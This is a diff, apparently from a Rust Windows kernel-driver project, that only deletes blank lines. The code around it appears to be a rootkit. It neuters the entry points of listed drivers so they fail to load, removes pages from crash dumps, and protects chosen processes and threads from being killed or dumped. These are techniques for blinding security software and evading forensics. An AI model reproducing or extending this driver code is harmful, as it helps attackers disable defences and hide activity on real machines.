@@ -81,13 +81,11 @@ impl<'a> Callback<'a> {
         }
     }
     }
-
     /// Registers callbacks for thread operations.
     fn thread(&self) -> NTSTATUS {
         let altitude = uni::str_to_unicode("31243.5223");
         let altitude_str = altitude.to_string_lossy(); // Convert for logging
         log::debug!("Attempting to register thread callback with altitude {}", altitude_str);
-        
         let mut op_reg = OB_OPERATION_REGISTRATION {
             ObjectType: unsafe { PsThreadType },
             Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
@@ -102,7 +100,6 @@ impl<'a> Callback<'a> {
             RegistrationContext: null_mut(),
             OperationRegistration: &mut op_reg,
         };
-    
         let status = unsafe { 
             ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD))
         };
@@ -118,14 +115,12 @@ impl<'a> Callback<'a> {
         let altitude = uni::str_to_unicode("31243.5222");
         let altitude_str = altitude.to_string_lossy();
         log::debug!("Attempting to register process callback with altitude {}", altitude_str);
-        
         let mut op_reg = OB_OPERATION_REGISTRATION {
             ObjectType: unsafe { PsProcessType },
             Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
             PreOperation: Some(process::on_pre_open_process),
             PostOperation: None,
         };
-    
         let mut cb_reg = OB_CALLBACK_REGISTRATION {
             Version: OB_FLT_REGISTRATION_VERSION as u16,
             OperationRegistrationCount: 1,
@@ -133,7 +128,6 @@ impl<'a> Callback<'a> {
             RegistrationContext: null_mut(),
             OperationRegistration: &mut op_reg,
         };
-    
         let status = unsafe { 
             ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS))
         };
@@ -150,9 +144,7 @@ impl<'a> Callback<'a> {
         let altitude_str = altitude_owned.to_string_lossy();
         // Use the UNICODE_STRING for the actual API call.
         let altitude = altitude_owned.to_unicode();
-        
         log::debug!("Attempting to register registry callback with altitude {}", altitude_str);
-        
         let status = unsafe { 
             CmRegisterCallbackEx(
                 Some(registry_callback),
@@ -163,13 +155,11 @@ impl<'a> Callback<'a> {
                 null_mut(),
             ) 
         };
-    
         if NT_SUCCESS(status) {
             log::info!("Registry callback registered successfully with altitude {}", altitude_str);
         } else {
             log::error!("CmRegisterCallbackEx failed with status: {}", status);
         }
-    
         status
     }
     /// Registers an image load notification routine.
@@ -189,27 +179,22 @@ impl<'a> Callback<'a> {
                 ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_PROCESS);
                 log::info!("Process callback unregistered successfully.");
             }
-    
             if !CALLBACK_REGISTRATION_HANDLE_THREAD.is_null() {
                 ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_THREAD);
                 log::info!("Thread callback unregistered successfully.");
             }
-    
             if CALLBACK_REGISTRY.QuadPart != 0 {
                 CmUnRegisterCallback(CALLBACK_REGISTRY);
                 log::info!("Registry callback unregistered successfully.");
             }
-    
             KeDeregisterBugCheckReasonCallback(&mut BUG_CHECK);
             log::info!("BugCheck callback unregistered successfully.");
-    
             PsRemoveLoadImageNotifyRoutine(Some(image_notify_routine));
             log::info!("Image load notify callback unregistered successfully.");
         }
     }
     
 }
-
 /// Callback function triggered during a system crash (bug check).
 ///
 /// This function modifies the crash dump behavior by marking specific memory
@@ -235,19 +220,15 @@ fn bug_check_remove_pages(
         (*dump_data).Flags = KB_REMOVE_PAGES_FLAG_VIRTUAL_ADDRESS;
     }
 }
-
 // Opcodes that will be entered to prevent the driver from being loaded
 const OPCODES: [u8; 6] = [
     0xB8, 0x01, 0x00, 0x00, 0xC0, // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
 	0xC3                         // ret
 ];
-
 // Maximum number of drivers that can be protected
 const MAX_DRIVER: usize = 256;
-
 /// List of drivers to block.
 static TARGET_DRIVERS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER)));
-
 /// Callback function triggered when an image (executable/DLL) is loaded.
 ///
 /// This function intercepts image loading events and checks for images. 
@@ -263,20 +244,17 @@ fn image_notify_routine(
         if (*ImageInfo).ImageBase.is_null() || ProcessId as usize != 0 {
             return;
         }
-
         // Convert the image name from UTF-16 to a Rust string
         let buffer = core::slice::from_raw_parts(
             (*FullImageName).Buffer,
             ((*FullImageName).Length / 2) as usize,
         );
-        
         // Check if the loaded image is the target
         let image_name = String::from_utf16_lossy(buffer);
         let drivers = TARGET_DRIVERS.lock();
         if !drivers.iter().any(|d| image_name.contains(d)) {
             return;
         }
-
         // Locate the entry point of the image
         let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
         let entry_point = ((*ImageInfo).ImageBase as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut u8;
@@ -298,7 +276,6 @@ pub mod driver {
         STATUS_QUOTA_EXCEEDED, STATUS_SUCCESS, 
         STATUS_UNSUCCESSFUL
     };
-
     /// Adds a driver to the list.
     ///
     /// # Arguments
@@ -310,17 +287,13 @@ pub mod driver {
     /// * A status code indicating the success or failure of the operation.
     pub fn add_driver(driver: String) -> NTSTATUS {
         let mut drivers = TARGET_DRIVERS.lock();
-
         if drivers.len() >= MAX_DRIVER {
             return STATUS_QUOTA_EXCEEDED;
         }
-
         if drivers.contains(&driver) {
             return STATUS_DUPLICATE_OBJECTID;
         }
-
         drivers.push(driver);
-
         STATUS_SUCCESS
     }
 
@@ -346,13 +319,10 @@ pub mod driver {
 }
 // Maximum Pids
 const MAX_PID: usize = 100;
-
 /// Handle for the process callback registration.
 pub static mut CALLBACK_REGISTRATION_HANDLE_PROCESS: *mut core::ffi::c_void = null_mut();
-
 /// List of target PIDs protected by a mutex.
 static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID)));
-
 pub mod process {
     use alloc::vec::Vec;
     use super::TARGET_PIDS;
@@ -364,7 +334,6 @@ pub mod process {
         PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
         PROCESS_VM_OPERATION, PROCESS_VM_READ,
     };
-
     /// Method for adding the list of processes that will have anti-kill / dumping protection.
     ///
     /// # Arguments
@@ -376,17 +345,13 @@ pub mod process {
     /// * A status code indicating the success or failure of the operation.
     pub fn add_pid(pid: usize) -> NTSTATUS {
         let mut pids = TARGET_PIDS.lock();
-
         if pids.len() >= super::MAX_PID {
             return STATUS_QUOTA_EXCEEDED;
         }
-
         if pids.contains(&pid) {
             return STATUS_DUPLICATE_OBJECTID;
         }
-
         pids.push(pid);
-
         STATUS_SUCCESS
     }
 
@@ -401,7 +366,6 @@ pub mod process {
     /// * A status code indicating the success or failure of the operation.
     pub fn remove_pid(pid: usize) -> NTSTATUS {
         let mut pids = TARGET_PIDS.lock();
-
         if let Some(index) = pids.iter().position(|&x| x == pid) {
             pids.remove(index);
             STATUS_SUCCESS
@@ -424,7 +388,6 @@ pub mod process {
                 ..Default::default()
             });
         }
-
         processes
     }
 
@@ -465,16 +428,12 @@ pub mod process {
         OB_PREOP_SUCCESS
     }
 }
-
 // Maximum TIDS
 const MAX_TID: usize = 100;
-
 /// Handle for the thread callback registration.
 pub static mut CALLBACK_REGISTRATION_HANDLE_THREAD: *mut core::ffi::c_void = null_mut();
-
 /// List of the target TIDs
 static TARGET_TIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID)));
-
 pub mod thread {
     use wdk_sys::ntddk::PsGetThreadId;
     use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
@@ -485,7 +444,6 @@ pub mod thread {
         alloc::vec::Vec,
         common::structs::TargetThread,
     };    
-    
     /// Method for adding the list of threads that will have anti-kill / dumping protection.
     ///
     /// # Arguments
@@ -497,17 +455,13 @@ pub mod thread {
     /// * A status code indicating the success or failure of the operation.
     pub fn add_target_tid(tid: usize) -> NTSTATUS {
         let mut tids = TARGET_TIDS.lock();
-
         if tids.len() >= super::MAX_TID {
             return STATUS_QUOTA_EXCEEDED;
         }
-
         if tids.contains(&tid) {
             return STATUS_DUPLICATE_OBJECTID;
         }
-
         tids.push(tid);
-
         STATUS_SUCCESS
     }
 
@@ -522,7 +476,6 @@ pub mod thread {
     /// * A status code indicating the success or failure of the operation.
     pub fn remove_target_tid(tid: usize) -> NTSTATUS {
         let mut tids = TARGET_TIDS.lock();
-
         if let Some(index) = tids.iter().position(|&x| x == tid) {
             tids.remove(index);
             STATUS_SUCCESS
